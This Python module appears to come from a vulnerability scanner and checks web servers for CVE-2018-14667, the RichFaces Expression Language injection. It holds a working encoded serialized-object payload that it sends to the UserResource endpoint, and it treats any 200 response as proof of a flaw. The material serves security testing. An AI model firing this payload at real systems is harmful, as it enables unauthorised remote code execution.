"""Agent Asteroid implementation for CVE-2018-14667"""
import re
from urllib import parse as urlparse

import requests
from ostorlab.agent.kb import kb
from ostorlab.agent.mixins import agent_report_vulnerability_mixin
from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = (
    "Red Hat JBoss RichFaces Framework Expression Language Injection Vulnerability"
)
VULNERABILITY_REFERENCE = "CVE-2018-14667"
VULNERABILITY_DESCRIPTION = (
    "The RichFaces Framework 3.X through 3.3.4 is vulnerable to Expression Language (EL) injection "
    "via the UserResource resource. A remote, unauthenticated attacker could exploit this to execute "
    "arbitrary code using a chain of java serialized objects via org.ajax4jsf.resource.UserResource$UriData."
)

DEFAULT_TIMEOUT = 90
JST_PATTERN = re.compile(r"JSF/(.*)")
TARGET_ENDPOINT = (
    "a4j/s/3_3_0.GAorg.ajax4jsf.resource.UserResource/n/s/-1487394660/DATA/"
)
PAYLOAD = (
    "eAHFlc9PE0EUx4cqyg9!oBARjUldjRRjZsHgAbEJCRo1KZJQQIWDmW5f26mzP5idbTcSFA9evBhEb968wsmzEY3xYOKFv0APxhh"
    "jQky8GmdmSyuNeuDSnmZ3337fe5!v29eV76jZ5-i0y!OYFEk4WPRzmIPvBtwCPOUDn6hcnJzi9CIRBKlf57lvMbQzhfZaHIiAUd"
    "cR4AiBDqaKpERMRpy8OZ4pgiWGU2g3hB6VmnPoLmpKoRbbzdIchWzlurlEWAD6IvRkLaeURIhzxAIfW67tuY7UxmkhE11xWRZ4m"
    "pSA33z!Irn87MNYDMVSqNVixPevERu21pAWnDp5WUObL9!Jag2BDkVVUtdMA6eE0Tskw2A49FT6XpkS-4GjC2AgfAwMT5L8GIiC"
    "m70UerITn7qO5oBQ0x6EQo56oqJlaH3cXKq7febRp42YjuusxtWUnj94mP4xs35BRagKhpQZnFqFCEFAMfE8Ri0iZNqIQ32S61y"
    "GAMeJp!fPr0x81ky6MsSHyIRaLoGO6OZDE5g5rcDXnklMuzzCtZFHa1H1uYZD5VWLLDSuCi1mXF8zqlO7antsaHWh7cay6I0YHa"
    "72Xhdabluc!bj2a0kBUNqt5SeofGKew1wAvsB5EKPK3kRf9ZhyiZwDeYPJQ!TQUOpYTR6eCBxBbTB0fFR-wpAqtfvUKbm3IeEEj"
    "PVhCMFKGBZhltG38B8nPS-UTR!f0nQ9HNV1ZqP7Z!vrA2Oqa42qPN-4dlDAUeesdjOCU!kkVtenv3w9Nn9ZD52c5ZhAXZogdfF4"
    "ILxAyEAgtkAdNbDRNEkO5XforVkdUdOGLCXRWyaERDIA3yx6kE!rMw4Lwmbxkf4z!fGRgYGzA4NJY8viSDbIbCPUS2mHXjv!-O7"
    "rZvXPz16Z26EV9peX0L0GNRGHaL2ifdqoQFCG5aIGZdMbtLY9mwpyXd7KBU7SqKg33iJFu6dC-zFabBTtzX-vv-F-hV5uD3cx8E"
    "XS2JRuHGuBWpTzk3Lt!gZHm9YF.jsf"
)


@exploits_registry.register
class CVE201814667Exploit(definitions.Exploit):
    """
    CVE-2018-14667: Red Hat JBoss RichFaces Framework Expression Language Injection Vulnerability
    """

    def accept(self, target: definitions.Target) -> bool:
        try:
            resp = requests.get(target.origin, verify=False, timeout=DEFAULT_TIMEOUT)
        except requests_exceptions.RequestException:
            return False

        if resp.status_code != 200:
            return False

        jsf_header = resp.headers.get("X-Powered-By", "Unknown")

        return JST_PATTERN.search(jsf_header) is not None

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        resp = requests.get(urlparse.urljoin(target.origin, TARGET_ENDPOINT + PAYLOAD))

        if resp.status_code != 200:
            return []

        vulnerability = self._create_vulnerability(target.origin)
        return [vulnerability]

    def _create_vulnerability(self, target_uri: str) -> definitions.Vulnerability:
        entry = kb.Entry(
            title=VULNERABILITY_TITLE,
            risk_rating="CRITICAL",
            short_description=VULNERABILITY_DESCRIPTION,
            description=VULNERABILITY_DESCRIPTION,
            references={
                "nvd.nist.gov": f"https://nvd.nist.gov/vuln/detail/{VULNERABILITY_REFERENCE}",
                "github.com": "https://github.com/syriusbughunt/CVE-2018-14667",
            },
            recommendation=(
                "- Make sure to install the latest security patches from software vendor \n"
                "- Update to the latest software version"
            ),
            security_issue=True,
            privacy_issue=False,
            has_public_exploit=True,
            targeted_by_malware=True,
            targeted_by_ransomware=True,
            targeted_by_nation_state=True,
        )
        technical_detail = (
            f"{target_uri} is vulnerable to {VULNERABILITY_REFERENCE}, "
            f"{VULNERABILITY_TITLE}"
        )
        vulnerability = definitions.Vulnerability(
            entry=entry,
            technical_detail=technical_detail,
            risk_rating=agent_report_vulnerability_mixin.RiskRating.CRITICAL,
        )
        return vulnerability
